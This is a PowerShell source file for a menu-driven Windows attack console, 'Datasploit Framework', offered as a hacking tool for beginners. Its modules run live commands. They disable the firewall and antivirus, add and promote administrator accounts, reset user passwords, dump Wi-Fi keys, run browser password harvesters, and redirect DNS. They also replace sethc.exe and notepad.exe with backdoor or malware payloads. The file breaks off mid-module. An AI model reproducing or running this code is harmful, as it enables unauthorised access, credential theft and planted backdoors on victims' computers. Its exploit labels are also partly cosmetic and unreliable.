$Title=$Host.ui.rawui.windowtitle="Datasploit Framework"
clear
function payloads { 
    $pa=read-host "Payload:"
	if ($pa -eq "use/iexplorer/payload") {
	    $global:payload="iexplorer.exe"
		write-host "payload set as:" $payload -foregroundcolor $gcolor
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($pa -eq "use/quick-break/payload") {
		$global:payload="breaker.exe"
		write-host "payload set as:" $payload -foregroundcolor $gcolor
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($pa -eq "use/netsvc/payload") {
	    $global:payload="netsvc.bat"
		write-host "payload set as:" $payload -foregroundcolor $gcolor
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
    elseif ($pa -eq "use/wininit_des/payload") {
        $global:payload="wininit1.exe"
        write-host "payload set as:" $payload -foregroundcolor $gcolor
	    $pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
    }
	elseif ($pa -eq "use/bacteria/payload") {
	    $global:payload="balthazar.exe"
		write-host "payload set as:" $payload -foregroundcolor $gcolor
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($pa -eq "use/Ram_eater/payload") {
		$global:payload="Ram_eater.exe"
		write-host "payload set as:" $payload -foregroundcolor red
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($pa -eq "use/kill_sec/payload") {
		$global:payload="ckdefiant.exe"
		write-host "payload set as:" $payload -foregroundcolor $gcolor
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($pa -eq "use/inject_netsvc/payload") {
		$global:payload="inject_netsvc.exe"
		write-host "payload set as:" $payload -foregroundcolor $gcolor
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($pa -eq "use/sethc/payload") {
		$global:payload="sethc.exe"
		write-host "Payload set as:" $payload -foregroundcolor $gcolor
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	else {
	    write-host "payload not found" -foregroundcolor red
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
}
foreach ($a in date) {
    write-host $a.Hour
    if ($a.Hour -ge 17) {
        $ycolor1="yellow"
        $gcolor="green"
        $Host.UI.RawUI.BackgroundColor="black"
        $host.UI.RawUI.ForegroundColor="white"
        clear
        write-host "enabling night mode"
        sleep -s 2
    }
    else{
        $ycolor1="blue"
        $gcolor="Darkgreen"
        $Host.UI.RawUI.BackgroundColor="gray"
        $host.UI.RawUI.ForegroundColor="black"
        clear
        write-host "Disabling night mode"
        sleep -s 2
    }
}
write-host ""
write-host "Loading Datasploit Framework.........30% loaded" -foregroundcolor $ycolor1
sleep -s 1
write-host ""
write-host "Configuring files....................55% loaded" -foregroundcolor $ycolor1
sleep -s 1
write-host ""
write-host "Checking Validity.......................60% loaded" -foregroundcolor $ycolor1
sleep -s 1
write-host ""
write-host "Starting Datasploit Framework........100% loaded" -foregroundcolor $gcolor
sleep -s 1
clear 
while (1 -eq 1) { 
	write-host "                  Welcome to Datasploit Framework v3.1" -foregroundcolor $ycolor1
	write-host
	write-host "               Nigeria's leading Hacking tool for beginners" -foregroundcolor $ycolor1
	write-host
	write-host "                            Created by Okoro Eric" -foregroundcolor $gcolor
	write-host
	write-host "                            All rights reserved." -foregroundcolor red
	.\random.ps1
	write-host
	write-host "   |.............. ={Datasploit Framework v3.0.2}=......      )" -foregroundcolor red
	write-host
	write-host "   |..............=(Scanners, harvesters, password_crackers )" -foregroundcolor $ycolor1
	write-host
	write-host "   |..............=(Email me at: okoromadara1@gmail.com     )" -foregroundcolor $gcolor
	write-host	
	$script:input=read-host "DsP:> "
    if ($input -eq "show options"){
	   write-host Calling options function from Datasploit repository.........................
       sleep -s 3
       write-host OPTIONS:
	   write-host
       write-host "          Commands					Use"
       write-host "          --------------------------------------------------                     "
       write-host "          --------------------------------------------------                     "
       write-host "          show options               Displays this help message                  "
       write-host
       write-host "          Set                        Sets the correct path to use for Datasploit "
       write-host
       write-host "          show modules               Show list of commands available              "
       write-host
	   write-host "          show payloads              Show list of payloads available              "
	   write-host
	   write-host "          set payload                Sets Payload to use                          "   
	   write-host
	   write-host "          show exploits              Shows list of exploits available             "
	   write-host 
	   write-host "          Finger                     Probes Datasploit                            "
	   write-host
	   write-host "          Search                     Searches for the term in the repository"
       $x=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
       clear
	}
    elseif ($input -eq "exit") {
        Write-Host "Operation not permitted. Use 'Ctrl + C' or 'exit()' to close"
        $x=$host.ui.RawUI.ReadKey("NoEcho, Includekeydown")
        clear
    }
    elseif ($input -eq "exit()") {
        exit
    }
	elseif ($input.StartsWith("search")) {
        try {
            $a=$input.Substring(7)
            Write-Host "Searching Datasploit repository for:" $a
            sleep -s 2
            Write-Host "The search function only takes about 2-3 seconds, if it hangs, it simply means your input cannot be found"
            cat exploits.txt|Select-String $a
            $x=$Host.UI.RawUI.ReadKey("Noecho, Includekeydown")
            clear
        }
        catch {
            Write-Host "Error! Value for search not specified" -ForegroundColor Red
            $x=$Host.ui.RawUI.ReadKey("Noecho, Includekeydown")
            clear
        }
	}
	elseif ($input -eq "show modules") {
	   write-host Loading list of Modules from Datasploit Library:
	   sleep -s 3
	   write-host
       write-host "Exploits available:"
	   write-host "---------------------------"
	   write-host "---------------------------"
       write-host
	   write-host "...................................................................."
       write-host
       write-host "...................................................................."
       write-host
       write-host "....................................................................."
       write-host
       write-host "Commands                                   Rank                            OS version"
	   write-host .......................................................................................
	   write-host
       write-host "Readme                                    null                            null"
       write-host
       write-host "use/net/omeo/ms06_6D                      Good                            windows8-10    "
       write-host
       write-host "use/net/usr/ms12                          Amazing                         All Windows    "
	   write-host
	   write-host "use/usr/promote/ms13                      Good                            All Windows    "
	   write-host
	   write-host "use/usr/add/ms14                          Good                            All Windows    "
	   write-host
	   write-host "use/usr/enable/ms15                       Good                            All Windows    "
	   write-host
	   write-host "use/usr/disable/ms16                      Good                            All Windows    "
       write-host
       write-host "use/Fwall/dis/ms11                        Excellent                       Windows XP     "   
       write-host
       write-host "use/cmd/bgn3-3                            Normal                          All windows    "
       write-host
       write-host "use/kill_av/681                           Sketchy                         All windows    "
       write-host
       write-host "use/kill_sec/cyb                          Amazing                         All windows    "
       write-host
       write-host "use/harvester/ms10                        Great                           Windows Xp-10  "
       write-host
       write-host "use/inject/wifi                           Great                           Windows 8-10   "
       write-host
       write-host "use/wifi/exploit                          Great                           Windows 7-10   "
       write-host
       write-host "use/cve-backdoor/exploit                  Excellent                       Windows xp-10  "
       write-host
       write-host "use/cve-not-virus/exploit                 Excellent                       windows xp-10  "
	   write-host
	   write-host "use/cve-startup-inject/exploit            Excellent                       windows 7-10 "
	   write-host
	   write-host "use/tera-nova/exploit                     Dangerous                       All Windows    "
	   write-host
	   write-host "use/wifi/broadcast                        Great                           Windows 8-10   "
	   write-host
	   write-host "use/quick-break/exploit                   Good                            All windows"
	   write-host 
	   write-host "use/kill_sec/exploit                      Excellent                       All Windows"
	   write-host
	   write-host "use/enable-psremote/exploit               Amazing                         Windows7-10"
	   write-host
	   write-host "use/connect_remote/exploit                Amazing                         Windows7-10"
	   write-host
       Write-Host "use/start_hidden/exploit                  Great                           Windows7-10"
       Write-Host
       write-host "use/dns_address/exploit                   Good                            Windows7-10"
       write-host
       write-host "use/wifi_custom/exploit                   Good                            Windows7-10"
       write-host
       Write-Host "use/smb_mapping/exploit                   Great                           Windows7-10"
       Write-Host
       Write-Host "use/blot_ware/exploit                     Unforgivable                    Windowsxp-10"
       Write-Host
       Write-Host "use/ip_enumeration/exploit                Excellent                       Windows8-10"
       Write-Host
       Write-Host "use/ip_enumeration2/exploit               Great                           Windows7-10"
       Write-Host
	   .\Hello.ps1
       $pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
       clear
    }
	elseif ($input -eq "show exploits") {
	   write-host Loading list of exploits from Datasploit Library:
	   sleep -s 3
	   write-host
       write-host "Exploits available:"
	   write-host "---------------------------"
	   write-host "---------------------------"
       write-host
	   write-host "...................................................................."
       write-host
       write-host "...................................................................."
       write-host
       write-host "....................................................................."
       write-host
       write-host "Commands                                   Rank                            OS version"
	   write-host .......................................................................................
	   write-host
       write-host "Readme                                    null                            null"
       write-host
       write-host "use/net/omeo/ms06_6D                      Good                            windows8-10    "
       write-host
       write-host "use/net/usr/ms12                          Amazing                         All Windows    "
	   write-host
	   write-host "use/usr/promote/ms13                      Good                            All Windows    "
	   write-host
	   write-host "use/usr/add/ms14                          Good                            All Windows    "
	   write-host
	   write-host "use/usr/enable/ms15                       Good                            All Windows    "
	   write-host
	   write-host "use/usr/disable/ms16                      Good                            All Windows    "
       write-host
       write-host "use/Fwall/dis/ms11                        Excellent                       Windows XP     "   
       write-host
       write-host "use/cmd/bgn3-3                            Normal                          All windows    "
       write-host
       write-host "use/kill_av/681                           Sketchy                         All windows    "
       write-host
       write-host "use/kill_sec/cyb                          Amazing                         All windows    "
       write-host
       write-host "use/harvester/ms10                        Great                           Windows Xp-10  "
       write-host
       write-host "use/inject/wifi                           Great                           Windows 8-10   "
       write-host
       write-host "use/wifi/exploit                          Great                           Windows 7-10   "
       write-host
       write-host "use/cve-backdoor/exploit                  Excellent                       Windows xp-10  "
       write-host
       write-host "use/cve-not-virus/exploit                 Excellent                       windows xp-10  "
	   write-host
	   write-host "use/cve-startup-inject/exploit            Excellent                       windows 7-10 "
	   write-host
	   write-host "use/tera-nova/exploit                     Dangerous                       All Windows    "
	   write-host
	   write-host "use/wifi/broadcast                        Great                           Windows 8-10   "
	   write-host
	   write-host "use/quick-break/exploit                   Good                            All windows"
	   write-host
	   write-host "use/kill_sec/exploit                      Excellent                       All windows    "
	   write-host
	   write-host "use/enable-psremote/exploit               Amazing                         Windows7-10"
	   write-host
	   write-host "use/connect_remote/exploit                Amazing                         Windows7-10"
       Write-Host 
       Write-Host "use/start_hidden/exploit                  Great                           Windows7-10"
       write-host    
       write-host "use/dns_address/exploit                   Good                            Windows7-10"
       Write-Host
       Write-Host "use/wifi_custom/exploit                   Good                            Windows7-10" 
       Write-Host
       Write-Host "use/smb_mapping/exploit                   Great                           Windows7-10" 
       Write-Host                
	   Write-Host "use/blot_ware/exploit                     Unforgivable                    Windowsxp-10"
       write-host
       Write-Host "use/ip_enumeration/exploit                Excellent                       Windows8-10"
       Write-Host
       Write-Host "use/ip_enumeration2/exploit               Great                           Windows7-10"
       $pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
	   clear
	}
	elseif ($input -eq "Finger") {
		write-host "Fingering Framework.................."
		sleep -s 2
		write-host
		write-host "Current Version: V3.0.2"
		write-host 
		write-host "Author: Omeo"
		write-host
		write-host "Number of Exploits: 28"
		write-host
		write-host "Number of Payloads: 9 "
		write-host
		write-host "Module types: Scanners, Harvesters, password_crackers"
		$pause=$host.ui.rawui.readkey("NoEcho, IncludeKeyDown")	
		clear
	}
	elseif ($input -eq "Show payloads") {
	    .\Hello.ps1
	}
	elseif ($input -eq "Set payload") {
	    payloads
	}
    elseif ($input -eq "Set") { 
       $path=read-host "Set path to use for Datasploit" 
       clear
       type banner.py
       write-host "Setting path location......................" -foregroundcolor $ycolor1
       cd $path
       sleep -s 3
       write-host "Datasploit location set as" $path
       sleep -s 3
	   clear
    }
    elseif ($input -eq "use/smb_mapping/exploit") {
        clear
        while (1 -eq 1) {
            $map=read-host "use/smb_mapping/exploit"
            if ($map -eq "exploit") {
                Write-Host "Mapping" $computer_name "to" $drive_name "using" $user_name "as username and" $password "as password"
                sleep -s 1
                New-SmbMapping -localpath $drive_name -RemotePath $computer_name"\Datasploit_hacked" -UserName $user_name -Password $password
                Write-Host "Command completed successfully" -ForegroundColor $gcolor
                $x=$Host.ui.RawUI.ReadKey("Noecho, Includekeydown")
                clear
            }
            elseif ($map -eq "exit") {
                clear
                break
            }
            elseif ($map -eq "set computer name") {
                $computer_name=read-host "Enter computer Name"
                Write-Host "Target name set as:" $computer_name
                $x=$Host.ui.RawUI.ReadKey("Noecho, Includekeydown")
                clear
            }
            elseif ($map -eq "set drive name") {
                $drive_name=read-host "Enter drive name"
                Write-Host "Drive name set as:" $drive_name
                $x=$Host.ui.RawUI.ReadKey("Noecho, Includekeydown")
                clear
            }
            elseif ($map -eq "set user_name") {
                $user_name=read-host "Enter user_name"
                Write-Host "Username set as:" $user_name
                $x=$Host.ui.RawUI.ReadKey("Noecho, Includekeydown")
                clear
            }
            elseif ($map -eq "set password") {
                $password=read-host "Enter password"
                Write-Host "Password set as:" $password
                $x=$Host.ui.RawUI.ReadKey("Noecho, Includekeydown")
                clear
            }
            else {
                clear
				write-host "Nul Error identified:" $map "Commands: (exploit, set computer name, set drive name, set user_name, set password, exit) expected."
                write-host "Command received:" $map
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
				write-host "====================================================================="
				write-host
				write-host "use/smb_mapping/exploit         omeo         Great      Windows7-10"
				write-host
				write-host "DESCRIPTION:"
				write-host
				write-host "This module attempts to map a specified network location to a localdrive. It works in conjunction"
                Write-Host "with the 'wifi/broadcast' and the 'inject_wifi' exploit. After running either one on the target machine"
                Write-Host "it is necessary to run this one on yours. After successful exploitation, exit Datasploit and navigate to"
                Write-Host "the mapped drive using the 'cd drive_name' command; where 'drive_name stands for the name of the drive specified"
                Write-Host "by the user. Any letter is received as a drive name, so long as that letter is not being used already on the system."
                Write-Host "An example of a drive_name could be 'Y:'"
                Write-Host "The Username and Password fields requires the username and password of the target machine for access"
				write-host
                Write-Host "COMPUTER_NAME:"
                Write-Host 
                Write-Host $computer_name
                Write-Host
                Write-Host "DRIVE NAME:"
                Write-Host 
                Write-Host $drive_name
                Write-Host
                Write-Host "USERNAME:"
                Write-Host
                Write-Host $user_name
                Write-Host
                write-host "PASSWORD"
                Write-Host 
                Write-Host $password
                Write-Host
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "None"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
                Write-Host
                Write-Host "CURRENT COMPUTERS ATTACHED TO THE NETWORK:"
                net view
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
            }
                
        }
    }
    
	elseif ($input -eq "use/net/omeo/ms06_6D") {
	    clear
		while (1 -eq 1) {
		    $avira=read-host "use/net/omeo/ms06_6D:> "
		    if ($avira -eq "start") {
			   write-host "starting windows hotspot....."
               sleep -s 3
			   netsh wlan start hostednetwork
               netsh wlan set hostednetwork key=Avirarules
               write-host script completed
               write-host Hotspot password should be 'Avirarules'
               $pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
               cls 
			}
			elseif ($avira -eq "exit") {
			     clear
				 break
            }			
			else {
			    clear
				write-host "Command not understood. Type in start to start the Module "
				write-host "info: Starts the windows hotspot interface"
				write-host "Rank: Good"
				write-host "OS Level: Windows 8-10"
				write-host "May work on Windows 7 in some cases "
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
	    }
    }
	elseif ($input -eq "use/kill_sec/cyb") {
	    write-host "Attacking the cyberclock defender....."
		sleep -s 2
		write-host "In the future, Other cyber programs will be added."
		sleep -s 2
		write-host "Here we go...."
		taskkill /im ckdefiant.exe /f
		write-host "Done"
		$pause=$host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($input -eq "use/kill_av/681") {
		write-host "Attacking the antivirus service"
		sleep -s 2
		write-host "Hoping to add more antivirus services to this soon"
		sleep -s 2
		write-host "Okay then..........."
		net stop "avast! antivirus" 
		write-host "This should do it"
		$pause=$host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear
	}
	elseif ($input -eq "use/net/usr/ms12") {
	    clear
		while (1 -eq 1) {
		    $usr=read-host "use/net/usr/ms12:"
			if ($usr -eq "exploit") {
			    write-host "List of users available:"
				write-host
				net users
				$wew=read-host "Enter user name here: "
				write-host Probing username......................
				sleep -s 2
				net users $wew *
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
				break
			}
			elseif ($usr -eq "exit") {
			    clear
				break			
			}
			else {
			    clear
				write-host "Nul Error identified:" $usr "Commands: (exploit, exit) expected. Command received:" $usr
				write-host
				write-host "Exploit Options:"
				write-host
				write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
				write-host "====================================================================="
				write-host
				write-host "use/net/usr/ms12                Omeo         Amazing    All Windows"
				write-host
				write-host "DESCRIPTION:"
				write-host
				write-host "This module attempts to change the specified user's password"
				write-host
				write-host "PAYLOAD REQUIRED:"
				write-host
				write-host "None"
				write-host
				write-host "CURRENT PAYLOAD:"
				write-host
				write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			
			}
		}
    }
	elseif ($input -eq "use/usr/promote/ms13") {
	    clear
		while (1 -eq 1) {
		$usre=read-host "use/usr/promote/ms13:"
		if ($usre -eq "Escalate") {
		    write-host "List of users available"
			write-host
			net users
			$wew=read-host "Enter username here: "
			write-host "Escalating" $wew "to administrative level"
			net localgroup administrators $wew /add
			write-host "Script Completed"
			$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
			clear
		}
		elseif ($usre -eq "exit") {
		    clear
			break		
		}
		else {
		    write-host "Nul Error identified:" $usre "Commands: (escalate, exit) expected. Command received:" $usre
			write-host
			write-host "Exploit Options:"
			write-host
			write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			write-host "====================================================================="
			write-host
			write-host "use/usr/promote/ms13            Omeo         Amazing    All Windows"
			write-host
			write-host "DESCRIPTION:"
			write-host
			write-host "This module attempts to promote the specified user to administrator level. Giving"
            Write-Host "him/her high privileges"
			write-host
			write-host "PAYLOAD REQUIRED:"
			write-host
			write-host "None"
			write-host
			write-host "CURRENT PAYLOAD:"
			write-host
			write-host $payload
			$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
			clear		
		}
		}	
	}
	elseif ($input -eq "use/usr/add/ms14") {
	    write-host
		$us=read-host "Enter user name here:"
		net users $us /add
		write-host "Script Completed"
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear	
	}
	elseif ($input -eq "use/usr/enable/ms15") {
	    clear
		while (1 -eq 1) {
		$usre=read-host "use/usr/enable/ms15:"
		if ($usre -eq "Enable") {
		    write-host "List of users available"
			write-host
			net users
			$wew=read-host "Enter username here: "
			write-host "Enabling" $wew "account"
			net users  $wew /active:yes
			write-host "Script Completed"
			$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
			clear
		}
		elseif ($usre -eq "exit") {
		    clear
			break		
		}
		else {
            write-host "Nul Error identified:" $usre "Commands: (enable, exit) expected. Command received:" $usre
			write-host
			write-host "Exploit Options:"
			write-host
			write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			write-host "====================================================================="
			write-host
			write-host "use/usr/enable/ms15             Omeo         Amazing    All Windows"
			write-host
			write-host "DESCRIPTION:"
			Write-Host "This module enables a previously disabled account."
			write-host
			write-host "PAYLOAD REQUIRED:"
			write-host
			write-host "None"
			write-host
			write-host "CURRENT PAYLOAD:"
			write-host
			write-host $payload
			$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
			clear		
		}
		}	
	}
    elseif ($input -eq "use/dns_address/exploit") {
        clear
        while (1 -eq 1) {
            $usr=Read-Host "use/dns_address/exploit"
            if ($usr -eq "exploit") {
                write-host "Preparing to carry out dns spoofing for wi-fi interface. "
                sleep -s 1
                Write-Host "You can change this in the source code"
                sleep -s 2
                $us=read-host "enter value for new dns server"
                set-dnsclientserveraddress -interfacealias Wi-Fi -serveraddresses $us
                Write-Host "Dns server value changed"
                get-dnsclientserveraddress
                $x=$Host.ui.RawUI.ReadKey("NoEcho, IncludeKeyDown")
                clear
            }
            elseif ($usr -eq "exit") {
                clear
                break
            }
            else {
                write-host "Nul Error identified:" $usr "Commands: (exploit, exit) expected. Command received:" $usr
			    write-host
			    write-host "Exploit Options:"
			    write-host
			    write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			    write-host "====================================================================="
			    write-host
			    write-host "use/dns_address                 Omeo         Great      Windows7-10"
			    write-host
			    write-host "DESCRIPTION:"
			    Write-Host "This module changes the dns server of the victim's computer."
                Write-Host "This can either be for good or for bad; depending on the attackr's intention."
			    write-host "Changing the dns server to some random address, should stop the computer from making a connection to the internet."
                write-host "However, changing it to one of Google's dns servers might increase speed."
                write-host "An example would be 192.168.43.79, or Google's 8.8.8.8"
			    write-host "PAYLOAD REQUIRED:"
			    write-host
			    write-host "None"
			    write-host
			    write-host "CURRENT PAYLOAD:"
			    write-host
			    write-host $payload
			    $pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
			    clear
        	}	
        }
    }
	elseif ($input -eq "use/usr/disable/ms16") {
	    clear
		while (1 -eq 1) {
		$usre=read-host "use/usr/disable/ms16:"
		if ($usre -eq "Disable") {
		    write-host "List of users available"
			write-host
			net users
			$wew=read-host "Enter username here: "
			write-host "Disabling" $wew "account"
			net users $wew /active:no
			write-host "Script Completed"
			$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
			clear
		}
		elseif ($usre -eq "exit") {
		    clear
			break		
		}
		else {
            write-host "Nul Error identified:" $usre "Commands: (disable, exit) expected. Command received:" $usre
			write-host
			write-host "Exploit Options:"
			write-host
			write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			write-host "====================================================================="
			write-host
			write-host "use/usr/disable/ms16            Omeo         Amazing    All Windows"
			write-host
			write-host "DESCRIPTION:"
			Write-Host "This module disables a user account."
			write-host
			write-host "PAYLOAD REQUIRED:"
			write-host
			write-host "None"
			write-host
			write-host "CURRENT PAYLOAD:"
			write-host
			write-host $payload
			$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
			clear		
		}
		}	
	}
	elseif ($input -eq "use/Fwall/dis/ms11") {
	    write-host "Sending command to Windows firewall................"
		netsh advfirewall set allprofiles state off
		write-host "Command completed"
		$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
		clear		
	}
    elseif ($input -eq "use/harvester/ms10") {
	    clear
		while (1 -eq 1) {
		    $ms10=read-host "use/harvester/ms10:"
		    if ($ms10 -eq "harvest") {
			    write-host "Probing browsers for passwords..............."
				sleep -s 3
				write-host "Attempting to harvest passwords"
				start .\exploit_scripts\browser\harvester.exe
				start .\exploit_scripts\browser\harvester..exe
				.\exploit_scripts\browser\ChromePass.exe /stext harvest.txt
				write-host script completed
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
			elseif ($ms10 -eq "exit") {
			    clear
				break			
			}
			else {
                write-host "Nul Error identified:" $ms10 "Commands: (harvest, exit) expected. Command received:" $ms10
			    write-host
			    write-host "Exploit Options:"
			    write-host
			    write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			    write-host "====================================================================="
			    write-host
			    write-host "use/harvester/ms10              Omeo         Great      Windowsxp-10"
			    write-host
			    write-host "DESCRIPTION:"
			    Write-Host "This module searches for saved passwords in browsers. Browsers vulnerable"
                Write-Host "would be Mozilla, Chrome and Internet Explorer".
                Write-Host "Note: It must be understood here that I am not the creator of the apps used"
                Write-Host "in this specific exploit. That title goes to the company responsible. I"
                Write-Host "simply created the link to make them work."
			    write-host
			    write-host "PAYLOAD REQUIRED:"
			    write-host
			    write-host "None"
			    write-host
			    write-host "CURRENT PAYLOAD:"
			    write-host
			    write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear			
			}
	    }

	}
	elseif ($input -eq "use/wifi/exploit") {
	    clear
		while (1 -eq 1) {
		    $ms1=read-host "use/wifi/exploit"
		    if ($ms1 -eq "harvest") {
			    write-host "Scanning system for available profiles..............."
				sleep -s 3
				write-host "Profile(s) available: "
				netsh wlan show profiles
                $a=read-host "enter profile name here:"
				netsh wlan show profiles name=$a key=clear
				write-host "Script Completed"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
			elseif ($ms1 -eq "exit") {
			    clear
				break			
			}
			else {
                write-host "Nul Error identified:" $ms1 "Commands: (harvest, exit) expected. Command received:" $ms1
			    write-host
			    write-host "Exploit Options:"
			    write-host
			    write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			    write-host "====================================================================="
			    write-host
			    write-host "use/wifi/exploit                Omeo         Great      Windowsxp-10"
			    write-host
			    write-host "DESCRIPTION:"
			    Write-Host "Scans system for available wifi password"
			    write-host
			    write-host "PAYLOAD REQUIRED:"
			    write-host
			    write-host "None"
			    write-host
			    write-host "CURRENT PAYLOAD:"
			    write-host
			    write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear			
			}
	    }

	}
    elseif ($input -eq "use/wifi_custom/exploit") {
        clear
        while (1 -eq 1) {
            $wifi=read-host "use/wifi_custom/exploit"
            if ($wifi -eq "exploit") {
                write-host "Setting up payload parameters....................."
                sleep -s 1
                $payload=Read-Host "enter value here"
                write-host "Binding payload name to payload................."
                sleep -s 1
                write-host "Creating custom payload"
                write "@echo off" >> wifi_payload.bat
                write "netsh wlan show profiles name=$payload key=clear >> wifi_key.txt" >> wifi_payload.bat
                write "echo Command completed" >> wifi_payload.bat
                write-host "Payload Created as wifi_payload.bat"
                $pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
            }
            elseif ($wifi -eq "exit") {
                clear
                break
            }
            else {
                write-host "Nul Error identified:" $payload "Commands: (harvest, exit) expected. Command received:" $payload
			    write-host
			    write-host "Exploit Options:"
			    write-host
			    write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			    write-host "====================================================================="
			    write-host
			    write-host "use/wifi_custom/exploit         Omeo         Good       Windows7-10"
			    write-host
			    write-host "DESCRIPTION:"
			    Write-Host "Creates a custom form of the 'use/wifi/exploit'. The custom script could be saved"
                write-host "to be a pendrive to aid faster wifi password harvesting"
			    write-host
			    write-host "PAYLOAD REQUIRED:"
			    write-host
			    write-host "None"
			    write-host
			    write-host "CURRENT PAYLOAD:"
			    write-host
			    write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear	    
            }
        }
    }
	elseif ($input -eq "use/cve-backdoor/exploit") {
	    clear
		while (1 -eq 1) {
		    $cve=read-host "use/cve-backdoor/exploit:"
		    if ($cve -eq "exploit") {
			    write-host "Taking ownership of sethc using brute force..............."
				sleep -s 3
				write-host "Making use of" $payload "payload"
				sleep -s 2
				takeown /A /F C:\windows\system32\sethc.exe
				.\exploit_scripts\ownership\password_cracker.bat
				write-host "Brute force successful"
				write-host "Injecting Backdoor file. This may take a while..............."
				move-item -path C:\windows\system32\sethc.exe C:\users
				copy-item exploit_scripts\payloads\$payload -destination C:\windows\system32
				rename-item -path c:\windows\system32\$payload -newname C:\windows\system32\sethc.exe
				write-host "Injection attack completed successfully"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}			
            elseif ($cve -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($cve -eq "set payload") {
                payloads
            }
			elseif ($cve -eq "exit") {
			    clear
				break			
			}
			else {
                write-host "Nul Error identified:" $cve "Commands: (exploit, show payloads, set payload, exit) expected. Command received:" $cve
			    write-host
			    write-host "Exploit Options:"
			    write-host
			    write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			    write-host "====================================================================="
			    write-host
			    write-host "use/cve-backdoor/exploit        Omeo         Great      Windowsxp-10"
                write-host
                write-host "#Date: 28th March 2016"
			    write-host
			    write-host "DESCRIPTION:"
			    write-host "This module exploits a simple vulnerability in windows sethc function by replacing"
				write-host "it with a backdoor script."
                Write-Host
			    write-host "PAYLOAD REQUIRED:"
			    write-host
			    write-host "Sethc.exe"
			    write-host
			    write-host "CURRENT PAYLOAD:"
			    write-host
			    write-host $payload
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear			
			}
	    }
	}
    elseif ($input -eq "use/cve-not-virus/exploit") {
		clear
		while (1 -eq 1) {
			$viru=read-host "use/cve-not-virus/exploit:"
			if ($viru -eq "exploit") {
				write-host "Using payload:" $payload
				write-host "Taking ownership of notepad service using brute force..............."
				sleep -s 3
				takeown /A /F C:\windows\system32\notepad.exe
				.\exploit_scripts\ownership\notepad_malware.bat
				write-host "Brute force successful"
				write-host "Injecting malware. This may take a while..............." -foregroundcolor "red"
				move-item -path C:\windows\system32\notepad.exe C:\users
				copy-item exploit_scripts\payloads\$payload -destination C:\windows\system32
				rename-item -path C:\windows\system32\$payload -newname C:\windows\system32\notepad.exe
				write-host "Injection attack completed successfully" -foregroundcolor "red"
				$pause=$Host.ui.rawui.readkey("NoEcho, IncludeKeyDown")
				clear
			}
            elseif ($viru -eq "show payloads") {
                .\Hello.ps1
            }
            elseif ($viru -eq "set payload") {
                payloads
            }
			elseif ($viru -eq "exit") {
				clear
				break			
			}
			else {
                write-host "Nul Error identified:" $viru "Commands: (exploit, show payloads, set payload, exit) expected. Command received:" $viru
			    write-host
			    write-host "Exploit Options:"
			    write-host
			    write-host "NAME                           AUTHOR        RANK       OS LEVEL"        
			    write-host "====================================================================="
			    write-host
			    write-host "use/cve-not-virus/exploit        Omeo        Excellent  Windowsxp-10"
			    write-host
                Write-Host "#Date: 8th December 2016"
                Write-Host
			    write-host "DESCRIPTION:"
			    write-host "info: This module injects a malicious software that acts as the legitimate "
				write-host "notepad app"
                Write-Host
